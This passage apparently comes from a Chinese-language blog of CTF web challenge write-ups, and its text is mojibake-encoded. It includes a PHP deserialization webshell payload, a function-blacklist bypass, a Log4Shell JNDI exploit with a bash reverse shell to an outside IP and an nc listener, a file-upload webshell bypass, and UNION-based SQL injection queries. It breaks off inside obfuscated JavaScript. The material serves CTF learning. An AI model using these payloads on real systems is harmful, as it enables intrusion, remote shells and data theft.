<p>æ‰€ä»¥æ€»çš„åˆ©ç”¨æ€è·¯æ˜¯åˆ©ç”¨index.phpä¸­çš„SESSIONå†™å…¥payloadï¼Œè€ŒSESSIONçš„æ•°æ®ä¼šè¢«å­˜åœ¨æœåŠ¡å™¨çš„&#x2F;tmp&#x2F;sess_xxxä¸­ï¼Œå†ç”¨inc.phpä¸­çš„ini_set(â€˜session.serialize_handlerâ€™, â€˜phpâ€™)æ¥ååºåˆ—åŒ–æœåŠ¡å™¨ä¸Šçš„&#x2F;tmp&#x2F;sess_xxxxæ–‡ä»¶ï¼Œæ‰§è¡Œinc.phpé‡Œé¢Userç±»çš„file_put_contents()å‡½æ•°å†™å…¥ä¸€å¥è¯<br>payload:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;status=<span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> =<span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;1.php&quot;</span>,<span class="string">&quot;&lt;?php system(&#x27;cat fl*&#x27;);?&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));<span class="comment">//è¿›è¡Œbase64ç¼–ç ï¼Œå› ä¸ºindex.phpæ˜¯è¿›è¡Œäº†base64è§£ç </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>ç›´æ¥è¿›è¡Œåºåˆ—åŒ–ç”Ÿæˆçš„æ˜¯<code>O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;1.php&quot;;s:8:&quot;password&quot;;s:26:&quot;&lt;?php system(&#39;cat fl*&#39;);?&gt;&quot;;s:6:&quot;status&quot;;N;&#125;</code> è¿™ä¸ªpayloadå‰é¢åŠ ä¸Šåˆ†å‰²ç¬¦|,ç„¶åè¿›è¡Œbase64 </p>
<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span></span><br><span class="line"><span class="language-xml">â””â”€# echo &#x27;|O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;1.php&quot;;s:8:&quot;password&quot;;s:26:&quot;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat fl*&#x27;</span>);<span class="meta">?&gt;</span></span><span class="language-xml">&quot;;s:6:&quot;status&quot;;N;&#125;&#x27; | base64</span></span><br><span class="line"><span class="language-xml">fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7</span></span><br><span class="line"><span class="language-xml">czoyNjoiPD9waHAgc3lzdGVtKGNhdCBmbCopOz8+IjtzOjY6InN0YXR1cyI7Tjt9Cg==</span></span><br></pre></td></tr></table></figure>
<p>æœ€åç”¨bpæ‰“å¼€æŠ“åŒ…<br><img src="https://pic1.imgdb.cn/item/67ac694bd0e0a243d4fe9a75.png"><br>å†ç»™&#x2F;inc&#x2F;inc.phpå‘åŒ…<br><img src="https://pic1.imgdb.cn/item/67ac6952d0e0a243d4fe9a77.png"><br><strong>ä½†æ˜¯æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯æˆ‘ä»¬å†™å…¥çš„ session é©¬ä¸Šåˆä¼šè¢«åˆ é™¤ï¼Œä½¿ç”¨æˆ‘ä»¬åˆ©ç”¨ bp ä¸æ–­çš„å‘åŒ…ç„¶åè®¿é—® check.php æˆ–è€… inc&#x2F;inc.php éƒ½å¯ä»¥</strong><br>ä¿®æ”¹cookieçš„å€¼ï¼Œç„¶ålog-1.phpä¸­æŸ¥çœ‹<br><img src="https://pic1.imgdb.cn/item/67ac694dd0e0a243d4fe9a76.png"></p>
<h1 id="çº¢åŒ…é¢˜-è€—å­å°¾æ±"><a href="#çº¢åŒ…é¢˜-è€—å­å°¾æ±" class="headerlink" title="çº¢åŒ…é¢˜ è€—å­å°¾æ±"></a>çº¢åŒ…é¢˜ è€—å­å°¾æ±</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-11-30 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-11-30 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CTFSHOW_36_D</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$dis</span> = <span class="keyword">array</span>(<span class="string">&quot;var_dump&quot;</span>,<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;readfile&quot;</span>,<span class="string">&quot;highlight_file&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$a</span>,<span class="variable">$dis</span>,<span class="literal">true</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">forward_static_call_array</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">CTFSHOW_36_D</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;rlezphp!!!&quot;</span>;</span><br><span class="line">hackerrlezphp!!!</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œè¿‡æ»¤äº†å¾ˆå¤šå‡½æ•°<br><code>forward_static_call_array()</code> æ˜¯ PHP çš„ä¸€ä¸ªå†…ç½®å‡½æ•°ï¼Œä¸»è¦ç”¨äº<strong>åœ¨è¿è¡Œæ—¶åŠ¨æ€åœ°è°ƒç”¨ä¸€ä¸ªé™æ€æ–¹æ³•</strong>ï¼Œå¹¶ä¸”å…è®¸ä½¿ç”¨æ•°ç»„ä½œä¸ºå‚æ•°ä¼ é€’ã€‚å®ƒçš„ä½œç”¨ç±»ä¼¼äº <code>call_user_func_array()</code>ï¼Œä½†é€‚ç”¨äºé™æ€æ–¹æ³•è°ƒç”¨ã€‚<br>å¦‚æœ$aä¸åœ¨æ•°ç»„çš„ç³»åˆ—åå•ä¸­ï¼Œå°±ä¼šæ‰§è¡Œ forward_static_call_array æ–¹æ³•ã€‚<br>æ„é€  a ä¸ºä¸€ä¸ªå‘½ä»¤ï¼Œb ä½œä¸ºæ•°ç»„ä¼ é€’å‚æ•°ï¼špayloadï¼š<code>?a=\system&amp;b []=ls</code> ä½¿ç”¨åæ–œæ æ˜¯å› ä¸ºè¿™æ˜¯åœ¨å…¶ä»–çš„ç±»è°ƒç”¨çš„ç³»ç»Ÿå‡½æ•° systemï¼Œæ‰€ä»¥åŠ ä¸Š \ï¼Œä¹Ÿèƒ½ç»•è¿‡å‰é¢é»‘åå•çš„éªŒè¯ï¼š<br><img src="https://pic1.imgdb.cn/item/67ac6997d0e0a243d4fe9a8d.png"><br>æ¥ç€b[]&#x3D;cat flag.phpï¼Œåœ¨æºç ä¸­å¯ä»¥çœ‹åˆ°flag</p>
<h1 id="æ–°å¹´å¥½ï¼Ÿ"><a href="#æ–°å¹´å¥½ï¼Ÿ" class="headerlink" title="æ–°å¹´å¥½ï¼Ÿ"></a>æ–°å¹´å¥½ï¼Ÿ</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> flag = <span class="built_in">require</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getflag</span>(<span class="params">flag</span>) &#123;</span><br><span class="line">      res.<span class="title function_">send</span>(flag);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> delay = <span class="number">10</span> * <span class="number">1000</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">Number</span>.<span class="title function_">isInteger</span>(<span class="built_in">parseInt</span>(req.<span class="property">query</span>.<span class="property">delay</span>))) &#123;</span><br><span class="line">      delay = <span class="title class_">Math</span>.<span class="title function_">max</span>(delay, <span class="built_in">parseInt</span>(req.<span class="property">query</span>.<span class="property">delay</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> t = <span class="built_in">setTimeout</span>(getflag, delay,flag);</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">clearTimeout</span>(t);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;Timeout!&#x27;</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;);</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">set</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/javascript;charset=utf-8&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;./app.js&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Start listening&#x27;</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div>
<p>è¿™ä¸ªä»£ç æ˜¯ä¸€ä¸ªä½¿ç”¨ <code>Express.js</code> ç¼–å†™çš„ç®€å• Web æœåŠ¡å™¨ï¼Œç›‘å¬ <code>3000</code> ç«¯å£ï¼Œå¹¶æä¾›ä¸¤ä¸ªè·¯ç”±ï¼š<code>/flag</code> å’Œ <code>/</code>ã€‚<br><code>setTimeout(getflag, delay,flag);</code> åœ¨ delay ç§’ä¹‹åï¼Œä¼šæ‰§è¡Œ getflag æ–¹æ³•ï¼Œå¹¶ä¸”ä¼šå°† flag å½“åšå‚æ•°è¿›è¡Œä¼ å…¥<br>æµè§ˆå™¨å†…éƒ¨ä½¿ç”¨ 32 ä½å¸¦ç¬¦å·çš„æ•´æ•°ï¼Œæ¥å‚¨å­˜æ¨è¿Ÿæ‰§è¡Œçš„æ—¶é—´ã€‚è¿™æ„å‘³ç€ setTimeout æœ€å¤šåªèƒ½æ¨è¿Ÿæ‰§è¡Œ 2147483647 æ¯«ç§’ï¼ˆ24.8 å¤©ï¼‰è¶…è¿‡è¿™ä¸ªæ—¶é—´ä¼šå‘ç”Ÿæº¢å‡ºã€‚<br>å¦‚æœæº¢å‡ºäº†ä¹‹åï¼Œç›¸å½“äºä» 0 å¼€å§‹ï¼Œæ•´æ•°ä¸Šæº¢ï¼Œé‚£ä¹ˆç›¸å½“äºæˆ‘ä»¬å¯ä»¥æ§åˆ¶åªè¦åœ¨ 1000 ä¹‹å†…å°±å¯ä»¥<br>payload:<code>/flag?delay=2147483648</code></p>
<h1 id="çº¢åŒ…ä¸€"><a href="#çº¢åŒ…ä¸€" class="headerlink" title="çº¢åŒ…ä¸€"></a>çº¢åŒ…ä¸€</h1><p><img src="https://pic1.imgdb.cn/item/67ac698bd0e0a243d4fe9a8b.png"><br>ç”¨f12æ‰“å¼€è°ƒè¯•æ¨¡å¼ï¼Œæœç´¢flagå‡ºç°ä¸€ä¸ªgetflagçš„å‡½æ•°,åœ¨æ§åˆ¶å°è¾“å…¥getflag()å°±å‡ºç°flag<br><img src="https://pic1.imgdb.cn/item/67ac6979d0e0a243d4fe9a80.png"></p>
<h1 id="Log4j-å¤ç°"><a href="#Log4j-å¤ç°" class="headerlink" title="Log4j å¤ç°"></a>Log4j å¤ç°</h1><p>é¢˜ç›®æè¿°ï¼šLog4j å¤ç°ï¼Œå¸ˆå‚…ä»¬åˆ«åˆ°å¤„ RCE äº†<br><img src="https://pic1.imgdb.cn/item/67ac6975d0e0a243d4fe9a7f.png"><br>ä¸€ä¸ªç™»å½•æ¡†ï¼Œç™»å½•å†…å®¹æœ‰å›æ˜¾<br>è¿™é¢˜è€ƒæŸ¥çš„æ˜¯log4j  Log4j æ¼æ´åˆå â€œLog4Shellâ€ï¼Œæ˜¯ 2021 å¹´ 11 æœˆåœ¨ Apache Log4j æ—¥å¿—è®°å½•åº“å‘ç°çš„ä¸€ä¸ªä¸¥é‡æ¼æ´ã€‚Log4Shell æœ¬è´¨ä¸Šè®©é»‘å®¢å®Œå…¨æ§åˆ¶è¿è¡Œæœªæ‰“è¡¥ä¸ Log4j ç‰ˆæœ¬çš„è®¾å¤‡ã€‚<br>åˆ©ç”¨JNDIExploitå·¥å…·Â <br>ä½¿ç”¨æ–¹å¼</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">java</span> -jar JNDI-Injection-Exploit-<span class="number">1</span>.<span class="number">0</span>-SNAPSHOT-<span class="literal">all</span>.jar -C <span class="string">&quot;bash -c &#123;echo,(bash -i &gt;&amp; /dev/tcp/IP/12345 0&gt;&amp;1)çš„base64ç¼–ç &#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> -A <span class="string">&quot;IP&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>æœ¬æœºç›‘å¬12345ç«¯å£</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lnvp <span class="number">12345</span></span><br></pre></td></tr></table></figure></div>
<p>payload:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line"><span class="string">?u</span>ser=<span class="variable">$%</span>7<span class="symbol">Bjndi:</span><span class="symbol">rmi:</span>/<span class="regexp">/ip:1099/whsy</span>9k%7D</span><br></pre></td></tr></table></figure></div>

<p>æ³¨ï¼šæœ¬ç¯‡çš„wpéåŸåˆ›ï¼Œæœ¬äººä¹Ÿä¸ºctfæ–°æ‰‹ï¼Œä»…ä¾›å‚è€ƒå­¦ä¹ ã€‚</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>MoeCTF_2022web</title>
    <url>/posts/35880.html</url>
    <content><![CDATA[<p>MoeCTF_2022webæ–¹å‘WP</p>
<span id="more"></span>
<h1 id="what-are-y0u-uploadingï¼Ÿ"><a href="#what-are-y0u-uploadingï¼Ÿ" class="headerlink" title="what are y0u uploadingï¼Ÿ"></a>what are y0u uploadingï¼Ÿ</h1><p><img src="https://pic1.imgdb.cn/item/67ba911bd0e0a243d4025fcc.png"><br>æ–‡ä»¶ä¸Šä¼ é¢˜ç›®ï¼Œå…ˆéšä¾¿ä¸Šä¼ ä¸€ä¸ªæ­£å¸¸çš„ä¸€å¥è¯æœ¨é©¬çš„phpæ–‡ä»¶ï¼Œçœ‹çœ‹æœ‰ä»€ä¹ˆé™åˆ¶<br>æç¤ºåªèƒ½ä¸Šä¼ å›¾ç‰‡ç±»å‹æ–‡ä»¶ï¼Œç„¶åæ‰“å¼€bpï¼Œç°åœ¨æœ¬æœºæŠŠæ–‡ä»¶æ”¹æˆjpgæ ¼å¼ï¼Œç„¶åbpä¸­ä¿®æ”¹åç¼€çœ‹çœ‹æ˜¯ä¸æ˜¯åœ¨å‰ç«¯åšæ ¡éªŒ<br>ä¿®æ”¹åç¼€åæˆåŠŸä¸Šä¼ äº†</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line">æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼filenameï¼š<span class="number">2</span><span class="selector-class">.php</span></span><br><span class="line">æˆ‘ä¸æƒ³è¦è¿™ä¸ªç‰¹æ´›ä¼Šæ–‡ä»¶ï¼Œç»™æˆ‘ä¸€ä¸ªf1ag<span class="selector-class">.php</span> æˆ‘å°±ç»™ä½ flag!</span><br></pre></td></tr></table></figure></div>
<p>é‚£æˆ‘ä»¬å°±æ–°å»ºä¸€ä¸ªf1ag.jpgæ–‡ä»¶ç„¶åæ”¹æˆphpä¸Šä¼ ç»™ä»–ï¼Œæ‹¿åˆ°flag<br><img src="https://pic1.imgdb.cn/item/67ba92c4d0e0a243d402603a.png"></p>
<h1 id="Sqlmap-boy"><a href="#Sqlmap-boy" class="headerlink" title="Sqlmap_boy"></a>Sqlmap_boy</h1><p><img src="https://pic1.imgdb.cn/item/67ba92ffd0e0a243d4026046.png"><br>ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œæ ¹æ®é¢˜ç›®çš„æ„æ€ç”¨sqlmapå·¥å…·å¯ä»¥ç›´æ¥ä¸€æŠŠæ¢­ï¼Ÿ<br>éšä¾¿è¾“å…¥ä¸€ä¸ªè´¦å·å¯†ç ç„¶åbpæŠ“åŒ…ï¼Œ ç”¨sqlè·‘ä¸€ä¸‹  æ²¡è·‘å‡ºæ¥<br>åœ¨é¡µé¢çš„æºä»£ç å‘ç°æœ‰æç¤ºï¼Œè¿™æ˜¯sqlæŸ¥è¯¢è¯­å¥çš„æºä»£ç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- $sql = &#x27;select username,password from users where username=&quot;&#x27;.$username.&#x27;&quot; &amp;&amp; password=&quot;&#x27;.$password.&#x27;&quot;;&#x27;; --&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>é‚£å°±å¯ä»¥åœ¨usernameè¿™é‡Œé—­åˆ è¾“å…¥<code>admin&quot; #</code>è·³è½¬åˆ°<code>http://node5.anna.nssctf.cn:27698/secrets.php?id=1</code><br>è¿™é‡Œå°±æœ‰æ³¨å…¥ç‚¹äº†</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>çˆ†åº“</span><br><span class="line">?id=<span class="number">-1</span><span class="string">&#x27; union select 1,database(),3 -- + </span></span><br><span class="line"><span class="string">moectf</span></span><br><span class="line"><span class="string">3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2.çˆ†è¡¨</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(<span class="built_in">table_name</span>),<span class="number">3</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="comment">-- + </span></span><br><span class="line">articles,flag,users</span><br><span class="line"><span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>çˆ†å­—æ®µ</span><br><span class="line">?id=<span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>flag<span class="string">&#x27; -- + </span></span><br><span class="line"><span class="string">flAg</span></span><br><span class="line"><span class="string">3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">4.çˆ†å€¼</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(flAg),<span class="number">3</span> <span class="keyword">from</span> flag <span class="comment">-- + </span></span><br><span class="line">NSSCTF&#123;<span class="number">4e6</span>ccb7d<span class="number">-4</span>dc7<span class="number">-417</span>c<span class="number">-839</span>b<span class="number">-7522e2460305</span>&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="God-of-aim"><a href="#God-of-aim" class="headerlink" title="God_of_aim"></a>God_of_aim</h1><p><img src="https://pic1.imgdb.cn/item/67baaa3ad0e0a243d4026c87.png"><br>æºä»£ç ä¸­æœ‰ä¸€ä¸ªæ³¨é‡Š <code>  &lt;!-- ä½ çŸ¥é“å—ï¼Ÿindex.jså®ä¾‹åŒ–äº†ä¸€ä¸ªaimTrainerå¯¹è±¡--&gt;</code><br>åœ¨æºä»£ç ä¸­ç‚¹å‡»aimtrainer.jsç•Œé¢çœ‹æºä»£ç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="WREN"><figure class="iseeu highlight /wren"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="variable">_0x78bd</span> <span class="operator">=</span> [<span class="string">&quot;<span class="char escape_">\x61</span><span class="char escape_">\x69</span><span class="char escape_">\x6D</span><span class="char escape_">\x54</span><span class="char escape_">\x72</span><span class="char escape_">\x61</span><span class="char escape_">\x69</span><span class="char escape_">\x6E</span><span class="char escape_">\x65</span><span class="char escape_">\x72</span><span class="char escape_">\x45</span><span class="char escape_">\x6C</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x61</span><span class="char escape_">\x69</span><span class="char escape_">\x6D</span><span class="char escape_">\x2D</span><span class="char escape_">\x74</span><span class="char escape_">\x72</span><span class="char escape_">\x61</span><span class="char escape_">\x69</span><span class="char escape_">\x6E</span><span class="char escape_">\x65</span><span class="char escape_">\x72</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x67</span><span class="char escape_">\x65</span><span class="char escape_">\x74</span><span class="char escape_">\x45</span><span class="char escape_">\x6C</span><span class="char escape_">\x65</span><span class="char escape_">\x6D</span><span class="char escape_">\x65</span><span class="char escape_">\x6E</span><span class="char escape_">\x74</span><span class="char escape_">\x42</span><span class="char escape_">\x79</span><span class="char escape_">\x49</span><span class="char escape_">\x64</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x73</span><span class="char escape_">\x63</span><span class="char escape_">\x6F</span><span class="char escape_">\x72</span><span class="char escape_">\x65</span><span class="char escape_">\x45</span><span class="char escape_">\x6C</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x73</span><span class="char escape_">\x63</span><span class="char escape_">\x6F</span><span class="char escape_">\x72</span><span class="char escape_">\x65</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x61</span><span class="char escape_">\x69</span><span class="char escape_">\x6D</span><span class="char escape_">\x73</span><span class="char escape_">\x63</span><span class="char escape_">\x6F</span><span class="char escape_">\x72</span><span class="char escape_">\x65</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x64</span><span class="char escape_">\x65</span><span class="char escape_">\x6C</span><span class="char escape_">\x61</span><span class="char escape_">\x79</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x74</span><span class="char escape_">\x61</span><span class="char escape_">\x72</span><span class="char escape_">\x67</span><span class="char escape_">\x65</span><span class="char escape_">\x74</span><span class="char escape_">\x53</span><span class="char escape_">\x69</span><span class="char escape_">\x7A</span><span class="char escape_">\x65</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x61</span><span class="char escape_">\x69</span><span class="char escape_">\x6D</span><span class="char escape_">\x73</span><span class="char escape_">\x63</span><span class="char escape_">\x6F</span><span class="char escape_">\x72</span><span class="char escape_">\x65</span><span class="char escape_">\x45</span><span class="char escape_">\x4C</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x73</span><span class="char escape_">\x65</span><span class="char escape_">\x74</span><span class="char escape_">\x53</span><span class="char escape_">\x63</span><span class="char escape_">\x6F</span><span class="char escape_">\x72</span><span class="char escape_">\x65</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x73</span><span class="char escape_">\x74</span><span class="char escape_">\x61</span><span class="char escape_">\x72</span><span class="char escape_">\x74</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x69</span><span class="char escape_">\x6E</span><span class="char escape_">\x6E</span><span class="char escape_">\x65</span><span class="char escape_">\x72</span><span class="char escape_">\x48</span><span class="char escape_">\x54</span><span class="char escape_">\x4D</span><span class="char escape_">\x4C</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x73</span><span class="char escape_">\x65</span><span class="char escape_">\x74</span><span class="char escape_">\x41</span><span class="char escape_">\x69</span><span class="char escape_">\x6D</span><span class="char escape_">\x53</span><span class="char escape_">\x63</span><span class="char escape_">\x6F</span><span class="char escape_">\x72</span><span class="char escape_">\x65</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x70</span><span class="char escape_">\x6F</span><span class="char 